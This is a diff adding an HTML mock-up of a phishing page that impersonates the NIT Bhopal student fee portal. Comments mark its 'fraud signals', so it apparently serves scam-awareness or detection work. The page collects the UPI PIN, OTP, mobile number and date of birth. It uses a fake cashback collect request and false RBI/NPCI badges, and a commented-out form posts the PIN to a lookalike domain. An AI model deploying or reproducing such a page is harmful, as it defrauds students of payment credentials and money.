@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NIT Bhopal — Student Fee Payment Portal</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #f0f2f5;
+      color: #333;
+      min-height: 100vh;
+    }
+
+    /* ── top bar ── */
+    .top-bar {
+      background: #1a237e;
+      color: white;
+      text-align: center;
+      font-size: 12px;
+      padding: 6px;
+      letter-spacing: 0.5px;
+    }
+
+    /* ── navbar ── */
+    .navbar {
+      background: #1a56c4;
+      /* background: #0d47a1; */
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .navbar-brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .navbar-logo {
+      width: 44px;
+      height: 44px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 14px;
+      color: #0d47a1;
+      letter-spacing: -1px;
+    }
+
+    .navbar-title {
+      color: white;
+    }
+
+    .navbar-title h1 {
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
+
+    .navbar-title p {
+      font-size: 11px;
+      opacity: 0.8;
+      margin-top: 1px;
+    }
+
+    .navbar-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .navbar-right a {
+      color: rgba(255, 255, 255, 0.8);
+      text-decoration: none;
+      font-size: 13px;
+    }
+
+    .navbar-right a:hover {
+      color: white;
+    }
+
+    .btn-login {
+      background: white;
+      color: #0d47a1;
+      padding: 7px 18px;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      text-decoration: none;
+    }
+
+    /* ── banner ── */
+    .banner {
+      background: linear-gradient(135deg, #1565c0, #0d47a1, #1a237e);
+      color: white;
+      text-align: center;
+      padding: 28px 20px;
+    }
+
+    .banner h2 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .banner p {
+      font-size: 13px;
+      opacity: 0.85;
+    }
+
+    .banner .deadline {
+      display: inline-block;
+      background: #f44336;
+      color: white;
+      padding: 4px 14px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      margin-top: 10px;
+      animation: blink 1.5s infinite;
+    }
+
+    @keyframes blink {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.6;
+      }
+    }
+
+    /* ── main layout ── */
+    .container {
+      max-width: 900px;
+      margin: 28px auto;
+      padding: 0 16px;
+      display: grid;
+      grid-template-columns: 1fr 340px;
+      gap: 20px;
+    }
+
+    /* ── payment card ── */
+    .card {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+    }
+
+    .card-header {
+      background: #1565c0;
+      /* background: #0d47a1; */
+      color: white;
+      padding: 14px 20px;
+      font-size: 15px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .card-header .icon {
+      width: 22px;
+      height: 22px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+    }
+
+    .card-body {
+      padding: 20px;
+    }
+
+    /* ── student info ── */
+    .student-info {
+      background: #e3f2fd;
+      border: 1px solid #90caf9;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin-bottom: 18px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+    }
+
+    .info-row {
+      font-size: 13px;
+    }
+
+    .info-label {
+      color: #666;
+      font-size: 11px;
+      margin-bottom: 2px;
+    }
+
+    .info-val {
+      font-weight: 600;
+      color: #1a237e;
+    }
+
+    /* ── fee table ── */
+    .fee-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 18px;
+      font-size: 13px;
+    }
+
+    .fee-table th {
+      background: #e8eaf6;
+      color: #1a237e;
+      padding: 10px 12px;
+      text-align: left;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .fee-table td {
+      padding: 10px 12px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .fee-table tr:last-child td {
+      border-bottom: none;
+      font-weight: 700;
+      background: #fafafa;
+    }
+
+    .fee-table .amount {
+      text-align: right;
+    }
+
+    /* ── form ── */
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 5px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .form-label .required {
+      color: #f44336;
+      margin-left: 2px;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 14px;
+      color: #333;
+      transition: border-color 0.2s;
+      outline: none;
+    }
+
+    .form-input:focus {
+      border-color: #0d47a1;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .upi-hint {
+      font-size: 11px;
+      color: #888;
+      margin-top: 4px;
+    }
+
+    /* ── PIN field — the fraud signal ── */
+    .pin-group {
+      background: #fff3e0;
+      border: 1px solid #ffb300;
+      border-radius: 6px;
+      padding: 12px 14px;
+      margin-bottom: 14px;
+    }
+
+    .pin-group .pin-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: #e65100;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .pin-group .pin-warning {
+      font-size: 11px;
+      color: #f57c00;
+      margin-top: 6px;
+    }
+
+    /* ── collect request box ── */
+    .collect-box {
+      background: #e8f5e9;
+      border: 1px solid #66bb6a;
+      border-radius: 6px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+      font-size: 13px;
+    }
+
+    .collect-box .collect-title {
+      font-weight: 700;
+      color: #2e7d32;
+      margin-bottom: 4px;
+      font-size: 13px;
+    }
+
+    .collect-box .collect-amount {
+      font-size: 20px;
+      font-weight: 900;
+      color: #1b5e20;
+      margin: 6px 0;
+    }
+
+    .collect-box .collect-sub {
+      font-size: 11px;
+      color: #388e3c;
+    }
+
+    /* ── submit button ── */
+    .btn-pay {
+      width: 100%;
+      background: linear-gradient(135deg, #0d47a1, #1565c0);
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.5px;
+      transition: opacity 0.2s;
+    }
+
+    .btn-pay:hover {
+      opacity: 0.9;
+    }
+
+    .secure-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 10px;
+      font-size: 11px;
+      color: #888;
+    }
+
+    /* ── sidebar ── */
+    .sidebar {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .notice-card {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+    }
+
+    .notice-header {
+      background: #c62828;
+      color: white;
+      padding: 10px 16px;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .notice-body {
+      padding: 14px 16px;
+    }
+
+    .notice-item {
+      padding: 8px 0;
+      border-bottom: 1px solid #f5f5f5;
+      font-size: 12px;
+      color: #555;
+      line-height: 1.5;
+    }
+
+    .notice-item:last-child {
+      border-bottom: none;
+    }
+
+    .notice-item strong {
+      color: #c62828;
+    }
+
+    .payment-logos {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-top: 4px;
+    }
+
+    .payment-logo {
+      background: #f5f5f5;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      padding: 4px 10px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #333;
+    }
+
+    /* ── footer ── */
+    footer {
+      background: #1a237e;
+      color: rgba(255, 255, 255, 0.7);
+      text-align: center;
+      padding: 16px;
+      font-size: 12px;
+      margin-top: 32px;
+    }
+
+    footer a {
+      color: rgba(255, 255, 255, 0.6);
+      text-decoration: none;
+    }
+
+    /* ── modal ── */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal {
+      background: white;
+      border-radius: 10px;
+      padding: 28px;
+      max-width: 380px;
+      width: 90%;
+      text-align: center;
+    }
+
+    .modal h3 {
+      color: #0d47a1;
+      margin-bottom: 8px;
+      font-size: 18px;
+    }
+
+    .modal p {
+      color: #666;
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+
+    .modal .otp-input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #0d47a1;
+      border-radius: 6px;
+      font-size: 20px;
+      text-align: center;
+      letter-spacing: 8px;
+      margin-bottom: 14px;
+    }
+
+    .modal .btn-verify {
+      width: 100%;
+      background: #0d47a1;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="top-bar">
+    National Institute of Technology Bhopal — Student Fee Services Portal
+  </div>
+
+  <nav class="navbar">
+    <div class="navbar-brand">
+      <div class="navbar-logo">NIT<br>B</div>
+      <!-- <div class="navbar-logo">NIT<br>BPL</div> -->
+      <div class="navbar-title">
+        <h1>NIT Bhopal</h1>
+        <p>Student Fee Payment System</p>
+      </div>
+    </div>
+    <div class="navbar-right">
+      <a href="#">Home</a>
+      <a href="#">Help</a>
+      <a href="#">Contact</a>
+      <a href="#" class="btn-login">Student Login</a>
+    </div>
+  </nav>
+
+  <div class="banner">
+    <h2>Semester Fee Payment — Even Semester 2024–25</h2>
+    <p>Pay your semester fees online using UPI, Net Banking, or Debit/Credit Card</p>
+    <span class="deadline">Last Date: March 31, 2025 — Pay Now to Avoid Fine</span>
+  </div>
+
+  <div class="container">
+
+    <!-- Payment Form -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon">₹</div>
+        Fee Payment Form
+      </div>
+      <div class="card-body">
+
+        <!-- Student Info -->
+        <div class="student-info">
+          <div class="info-row">
+            <div class="info-label">Student Name</div>
+            <div class="info-val">Rahul Kumar Singh</div>
+          </div>
+          <div class="info-row">
+            <div class="info-label">Roll Number</div>
+            <div class="info-val">2022ME0142</div>
+          </div>
+          <div class="info-row">
+            <div class="info-label">Programme</div>
+            <div class="info-val">B.Tech — Mechanical Engg.</div>
+          </div>
+          <div class="info-row">
+            <div class="info-label">Semester</div>
+            <div class="info-val">6th Semester</div>
+          </div>
+        </div>
+
+        <!-- Fee Breakdown -->
+        <table class="fee-table">
+          <thead>
+            <tr>
+              <th>Fee Component</th>
+              <th class="amount">Amount (₹)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Tuition Fee</td>
+              <td class="amount">62,500</td>
+            </tr>
+            <tr>
+              <td>Hostel Fee</td>
+              <td class="amount">12,000</td>
+            </tr>
+            <tr>
+              <td>Mess Advance</td>
+              <td class="amount">8,000</td>
+            </tr>
+            <tr>
+              <td>Development Fee</td>
+              <td class="amount">2,500</td>
+            </tr>
+            <tr>
+              <td><strong>Total Payable</strong></td>
+              <td class="amount"><strong>85,000</strong></td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- Collect Request Box — fraud signal -->
+        <div class="collect-box">
+          <div class="collect-title">
+            Refund Initiated — Claim Your Cashback
+          </div>
+          <div class="collect-amount">₹ 500</div>
+          <div class="collect-sub">
+            Accept this collect request to receive your fee concession
+            refund directly to your UPI account
+          </div>
+        </div>
+
+        <!-- Payment Form -->
+        <div class="form-group">
+          <label class="form-label">
+            UPI ID <span class="required">*</span>
+          </label>
+          <input class="form-input" type="text" placeholder="yourname@ybl or yourname@okaxis" />
+          <div class="upi-hint">
+            Enter your registered UPI ID to receive refund
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">
+              Mobile Number <span class="required">*</span>
+            </label>
+            <input class="form-input" type="tel" placeholder="Registered mobile" />
+          </div>
+          <div class="form-group">
+            <label class="form-label">
+              Date of Birth <span class="required">*</span>
+            </label>
+            <input class="form-input" type="date" />
+          </div>
+        </div>
+
+        <!-- PIN field — the primary fraud signal -->
+        <div class="pin-group">
+          <div class="pin-title">
+            🔐 Enter UPI PIN to Verify & Confirm Payment
+          </div>
+          <input class="form-input" type="password" placeholder="Enter your 4 or 6 digit UPI PIN" />
+          <input class="form-input" style="margin-top:8px" type="password" placeholder="Re-enter UPI PIN to confirm" />
+          <div class="pin-warning">
+            Your UPI PIN is required to authorise the fee payment
+            and receive your refund cashback
+          </div>
+        </div>
+        <button class="btn-pay" onclick="showModal()" style="background: linear-gradient(135deg, #1565c0, #1976d2);">
+          Pay &amp; Verify Now — ₹85,000
+        </button>
+        <!-- <button class="btn-pay" onclick="showModal()">
+          Confirm &amp; Verify Payment — ₹85,000
+        </button> -->
+
+        <div class="secure-badge">
+          🔒 256-bit SSL Secured &nbsp;|&nbsp;
+          RBI Approved Payment Gateway &nbsp;|&nbsp;
+          NPCI Certified
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Sidebar -->
+    <div class="sidebar">
+
+      <div class="notice-card">
+        <div class="notice-header">Important Notices</div>
+        <div class="notice-body">
+          <div class="notice-item">
+            <strong>Last date:</strong> March 31, 2025.
+            Late fee of ₹500/day applicable after due date.
+          </div>
+          <div class="notice-item">
+            Students must pay fees before filling examination forms.
+          </div>
+          <div class="notice-item">
+            Fee once paid will <strong>not be refunded</strong> except
+            in case of admission cancellation.
+          </div>
+          <div class="notice-item">
+            For queries contact: fees@nitbhopal-edu.in
+            <br>Helpline: 0755-000-0000
+          </div>
+        </div>
+      </div>
+
+      <div class="notice-card">
+        <div class="notice-header" style="background:#2e7d32">
+          Accepted Payment Methods
+        </div>
+        <div class="notice-body">
+          <div class="payment-logos">
+            <span class="payment-logo">UPI</span>
+            <span class="payment-logo">PhonePe</span>
+            <span class="payment-logo">GPay</span>
+            <span class="payment-logo">Paytm</span>
+            <span class="payment-logo">NEFT</span>
+            <span class="payment-logo">Debit Card</span>
+          </div>
+          <div class="notice-item" style="margin-top:10px">
+            Transaction charges: NIL for UPI payments
+          </div>
+        </div>
+      </div>
+
+      <div class="notice-card">
+        <div class="notice-header" style="background:#e65100">
+          Scholarship Refund Pending
+        </div>
+        <div class="notice-body">
+          <div class="notice-item">
+            Your scholarship amount of <strong>₹500</strong> is pending.
+            Accept the collect request after payment to claim your cashback.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <footer>
+    <p>
+      &copy; 2025 National Institute of Technology Bhopal |
+      <a href="#">Privacy Policy</a> |
+      <a href="#">Terms of Use</a> |
+      <a href="#">Contact Us</a>
+    </p>
+    <p style="margin-top:6px;font-size:11px;opacity:0.6">
+      fees-nitbhopal-edu.in — Student Financial Services Division
+    </p>
+  </footer>
+
+  <!-- OTP Modal -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <h3>Verify Payment</h3>
+      <p>An OTP has been sent to your registered mobile number.
+        Enter it below to confirm your payment of ₹85,000</p>
+      <input class="otp-input" type="tel" maxlength="6" placeholder="• • • • • •" />
+      <button class="btn-verify">Verify &amp; Pay Now</button>
+    </div>
+  </div>
+
+  <script>
+    function showModal() {
+      document.getElementById('modal').classList.add('active')
+    }
+    document.getElementById('modal').addEventListener('click', function (e) {
+      if (e.target === this) this.classList.remove('active')
+    })
+  </script>
+
+</body>
+
+</html>
+
+
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>NIT Bhopal — Fee Payment Portal</title>
+</head>
+<body>
+  <h1>NIT Bhopal Student Fee Payment</h1>
+  <p>Complete your semester fee payment below.</p>
+
+  <form action="https://fees-nitbhopal-edu.in/collect" method="POST">
+    <label>Student ID</label>
+    <input type="text" placeholder="Enter Student ID" />
+
+    <label>UPI ID</label>
+    <input type="text" placeholder="yourname@ybl" />
+
+    <label>Enter UPI PIN to verify</label>
+    <input type="password" placeholder="Enter your UPI PIN" />
+
+    <label>Amount</label>
+    <input type="text" value="85000" />
+
+    <p>Refund initiated — claim your cashback of ₹500 by verifying now</p>
+    <p>This is a collect request from NIT Bhopal Finance Department</p>
+
+    <button type="submit">Confirm &amp; Verify Payment</button>
+  </form>
+</body>
+</html> -->
